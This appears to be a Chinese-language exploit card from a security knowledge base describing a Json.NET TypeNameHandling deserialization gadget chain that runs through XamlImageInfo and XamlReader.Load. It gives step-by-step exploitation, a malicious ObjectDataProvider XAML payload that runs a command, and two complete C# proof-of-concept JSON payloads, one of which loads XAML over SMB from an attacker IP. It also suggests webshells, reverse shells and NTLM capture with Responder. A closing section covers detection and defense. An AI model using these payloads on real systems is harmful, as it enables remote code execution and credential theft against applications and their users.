---
id: web-dotnet-deser-xamlimageinfo-lazyfilestream-xamlreader-rce
title: .NET Json.NET 新 gadget XamlImageInfo：构造 Stream 注入 XAML，经 XamlReader.Load 触发 ObjectDataProvider RCE（LazyFileStream SMB / ReadOnlyStreamFromStrings 内联两链）
type: scenario
domain: web
path: web/dotnet/deserialization
technique: xamlimageinfo-xamlreader-gadget-chain
aliases:
- XamlImageInfo
- LazyFileStream
- ReadOnlyStreamFromStrings
- ManifestImages.ImageInfo
- XamlReader.Load RCE
- GroupedIEnumerable GroupEnumerator
- PresentationBuildTasks
- Microsoft.Web.Deployment
tags:
- dotnet
- deserialization
- json-net
- typenamehandling
- gadget
- xamlreader
- objectdataprovider
- rce
- smb
- wpf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:43:00+08:00'
  notes: 已对照原文及全部 6 张截图核对（原图均>1200px，已全部降采样到 img_small/01-06.jpg 阅读，无失败）：XamlImageInfo(Stream){_image=XamlReader.Load(stream)} 与图 03 代码一致；LazyFileStream(string path)→Path.GetFullPath、SourceStream 首次访问 new FileStream(...FileShare.Read)（图 01）；ReadOnlyStreamFromStrings(enumerator,stringSuffix) 内部 StringAsBufferEnumerator.Current=Encoding.UTF8.GetBytes(_enumerator.Current+_stringSuffix)（图 04-05）；两条链  全限定名/版本 4.0.0.0/Security 9.0.0.0/PublicKeyToken=31bf3856ad364e35、GroupedIEnumerable`1+GroupEnumerator[[System.String, mscorlib]] 与原文 PoC 逐字一致；图 03/06 均弹出计算器（ObjectDataProvider + cmd /c calc）。已修正 tag 拼写 typenam handling→typenamehandling（与库内惯例一致）。dedup top 候选（ActivitySurrogateSelector、AjaxPro、SolarWinds、Telerik XamlReader、CSharpCodeProvider、Remoting）均不同链；与 Telerik 卡同用 XamlReader 但入口/gadget 不同，互链合理。未在本机复跑。
---

## 一句话结论

`System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo` 的构造函数 `XamlImageInfo(Stream stream)` 内部直接调用 `XamlReader.Load(stream)`；在 Json.NET `TypeNameHandling.All` 的反序列化入口里，攻击者把 `stream` 指定为 `LazyFileStream`（读远程 SMB 上的 XAML）或 `ReadOnlyStreamFromStrings`（把内联 XAML 当字符串流），即可让 `XamlReader` 解析恶意 XAML 中的 `ObjectDataProvider` 启动任意进程，形成不依赖 BinaryFormatter 的新反序列化 gadget 链。

## 原理

- **gadget 根节点**：`XamlImageInfo` 继承 `ManifestImages.ImageInfo`，构造代码如下：
  ```csharp
  public XamlImageInfo(Stream stream) {
      this._image = XamlReader.Load(stream);
  }
  ```
  构造函数在反序列化实例化时自动执行，`XamlReader.Load` 会解析任意 XAML；WPF XAML 支持 `ObjectDataProvider`，后者可用 `Process.StartInfo` 启动 `cmd /c calc` 等命令，因此“控制 Stream 内容”即等于“代码执行”。
- **为什么需要一个可反序列化的 Stream**：`Stream` 是抽象类，Json.NET 不能直接实例化；需要找一个构造函数接受可控字符串/枚举器、并能把外部数据作为 `Stream` 读出的实现。本案给出两种。
- **链路 1：LazyFileStream（系统 GAC，需 SMB）**：
  `Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream`（程序集 `PresentationBuildTasks`）的构造函数 `LazyFileStream(string path)` 执行 `this._sourcePath = Path.GetFullPath(path)`；`SourceStream` 属性在首次访问时 `new FileStream(_sourcePath, FileMode.Open, FileAccess.Read, FileShare.Read)`。Json.NET 把 `path` 设成 `\\attacker\Poc\XamlImageInfo.xaml`，目标就会通过 SMB 拉取攻击者共享里的 XAML 文件并交给 `XamlReader.Load`。
  - 优点：`System.Activities.Presentation` 与 `PresentationBuildTasks` 都是系统默认 GAC 程序集，无需额外安装。
  - 缺点：需要目标能出站访问 SMB（445）；读取 UNC 路径时也可能触发机器/用户凭据的 NTLM 认证（可用于凭据泄露，见变体）。
- **链路 2：ReadOnlyStreamFromStrings（无需 SMB，需 Web Deploy 程序集）**：
  `Microsoft.Web.Deployment.ReadOnlyStreamFromStrings` 构造函数 `(IEnumerator<string> enumerator, string stringSuffix)` 内部创建私有 `StringAsBufferEnumerator`；其 `Current` 属性返回 `Encoding.UTF8.GetBytes(this._enumerator.Current + this._stringSuffix)`。Json.NET 把 `enumerator` 实例化为 `GroupedIEnumerable<string>+GroupEnumerator`（`enumerables` 为若干字符串列表，可放一个空字符串列表），并把完整 XAML 赋给 `stringSuffix`，于是流内容就是「当前枚举值 + 后缀」，即攻击者的 XAML。
  - 优点：不需要 SMB 出站，XAML 完全内联在 JSON 里。
  - 缺点：`Microsoft.Web.Deployment`（版本 9.0.0.0，GAC_MSIL）不是 Windows 默认程序集，需要目标安装 Web Deploy/Visual Studio 或对应 NuGet 包。
- **为什么能成立**：Json.NET 在 `TypeNameHandling.All`（或允许攻击者控制类型名的配置）下会根据 `$type` 实例化任意类型、按属性名匹配构造函数参数并递归反序列化嵌套对象；整条链没有自定义 `SerializationBinder` 白名单拦截，`XamlImageInfo` 的构造函数副作用就成了执行点。该链与 BinaryFormatter 无关，可绕过仅针对 BinaryFormatter 的防护。

## 触发条件

- 应用使用 Json.NET（Newtonsoft.Json）反序列化攻击者可控 JSON，且 `TypeNameHandling` 为 `All`/`Objects`/`Auto` 等允许类型名的配置，未启用安全 `SerializationBinder` 白名单。
- 链路 1：目标 GAC 中存在 `System.Activities.Presentation` 与 `PresentationBuildTasks`（Windows/.NET Framework 常见），且目标允许出站 SMB 445 访问攻击者主机。
- 链路 2：目标 GAC 中存在 `Microsoft.Web.Deployment`（安装 Web Deploy/VS/NuGet 后才有），无需 SMB。
- 目标为 .NET Framework/WPF 环境，`XamlReader` 可用且 XAML 的 `ObjectDataProvider` 未被禁用（完全信任）。
- 反序列化进程有启动子进程的权限（IIS 应用池常见低权，但足以执行命令/落地载荷）。

## 利用步骤

1. 在攻击者主机准备恶意 XAML（链路 1 放到 SMB 共享；链路 2 直接内联）：
   ```xml
   <?xml version="1.0" encoding="utf-8"?>
   <ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False"
       xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
       xmlns:sd="clr-namespace:System.Diagnostics;assembly=System"
       xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
     <ObjectDataProvider.ObjectInstance>
       <sd:Process>
         <sd:Process.StartInfo>
           <sd:ProcessStartInfo Arguments="/c calc" FileName="cmd"
               StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}"
               UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" />
         </sd:Process.StartInfo>
       </sd:Process>
     </ObjectDataProvider.ObjectInstance>
   </ObjectDataProvider>
   ```
2. 链路 1：在 `\\attacker\Poc\XamlImageInfo.xaml` 放置上述 XAML；构造 JSON，`$type` 为 `XamlImageInfo`，`stream` 的 `$type` 为 `LazyFileStream`、`path` 指向 UNC 路径。
3. 链路 2：构造 JSON，`$type` 为 `XamlImageInfo`，`stream` 为 `ReadOnlyStreamFromStrings`，`enumerator` 为 `GroupedIEnumerable<string>+GroupEnumerator`（`enumerables` 放一个空字符串列表），`stringSuffix` 为完整 XAML 字符串。
4. 调用目标 JSON 反序列化入口（案例 `JsonConvert.DeserializeObject(s5, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All })`）。
5. 观察命令执行（案例弹出计算器）；实战替换为落地 Webshell、命令回显或外带。
6. 若目标只禁用 BinaryFormatter，本链仍可用；若目标启用了 Json.NET 的 `SerializationBinder` 白名单，需要绕过或换入口。

## PoC

链路 1（SMB 加载远程 XAML）：

```csharp
var s5 = "{'$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'," +
         "'stream':{" +
         "'$type':'Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream, PresentationBuildTasks, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'," +
         "'path':'\\\\\\\\192.168.101.86\\\\Poc\\\\XamlImageInfo.xaml'" +
         "}}";
JsonConvert.DeserializeObject(s5, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
```

链路 2（内联 XAML，无需 SMB）：

```csharp
var s5 = "{'$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'," +
         "'stream':{" +
         "'$type':'Microsoft.Web.Deployment.ReadOnlyStreamFromStrings, Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'," +
         "'enumerator':{" +
         "'$type':'Microsoft.Web.Deployment.GroupedIEnumerable`1+GroupEnumerator[[System.String, mscorlib]], Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'," +
         "'enumerables':[{'$type':'System.Collections.Generic.List`1[[System.String, mscorlib]], mscorlib','$values':['']}]" +
         "}," +
         "'stringSuffix':'<XAML ... ObjectDataProvider Process.Start cmd /c calc ...>'" +
         "}}";
JsonConvert.DeserializeObject(s5, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
```

案例两条链均成功弹出计算器；链路 1 的 XAML 文件位于 `\\192.168.101.86\Poc\XamlImageInfo.xaml`。未在本机复跑。

## 变体与关联

- 关联：[[web-dotnet-deser-telerik-reporting-xmlserializer-type-expandedwrapper-xamlreader]]（同为 XamlReader gadget，入口为 Telerik 报表 XML 反序列化）。
- 关联：[[web-dotnet-deser-servicehandler-typenamehandling]]、[[web-dotnet-deser-solarwinds-arm-iformtemplate-typenamehandling]]（Json.NET `TypeNameHandling.All` 的典型入口，可接本 gadget）。
- 关联：[[web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass]]、[[web-dotnet-deser-ajaxpro-cve-2021-23758-objectdataprovider]]（其他 ObjectDataProvider/XAML 执行方式）。
- 变体：其它实现 `Stream` 且构造函数接受字符串/可序列化数据的类也可作为载体（`path`、`stringSuffix`、`enumerator` 类似的参数模式）。
- 变体：XAML 可换成 `XamlReader.Parse`、`ResourceDictionary`、`ObjectDataProvider` 调用任意静态方法；也可用 `sd:Process` 反弹 Shell。
- 变体：`LazyFileStream` 读 UNC 路径时可作为 SMB 凭据泄露原语（目标向攻击者发起 NTLM 认证）；配合 Responder 可获取 NetNTLM。
- 边界：Json.NET 版本/配置（`TypeNameHandling` 非 None、Binder 白名单）、目标缺相应 GAC 程序集、出站 SMB 被封、XAML 解析被禁用时失败。

## 检测与防御

- **反序列化配置**：禁止 `TypeNameHandling.All/Objects/Auto`；必须使用时绑定严格 `SerializationBinder` 白名单（只允许业务 DTO），或改用 `System.Text.Json`（默认不解析类型名）。
- **依赖治理**：移除不需要的 GAC/第三方程序集（PresentationBuildTasks、Microsoft.Web.Deployment 等）可减少 gadget 可用面；保持 Json.NET 版本更新。
- **网络侧**：限制应用服务器出站 SMB 445，阻断 `LazyFileStream` 的远程 XAML 加载与 NTLM 泄露；对 UNC 路径访问做告警。
- **检测**：监控 Json.NET 反序列化请求中出现 `$type`、`XamlImageInfo`、`LazyFileStream`、`ReadOnlyStreamFromStrings`、`XamlReader` 等特征；w3wp 进程创建 cmd/powershell/calc 子进程；异常 SMB 出站与 NTLM 认证。
- **响应**：发现 gadget 利用时隔离主机、审计反序列化入口与 JSON 日志、修复 TypeNameHandling/Binder 配置并轮换可能泄露的凭据。
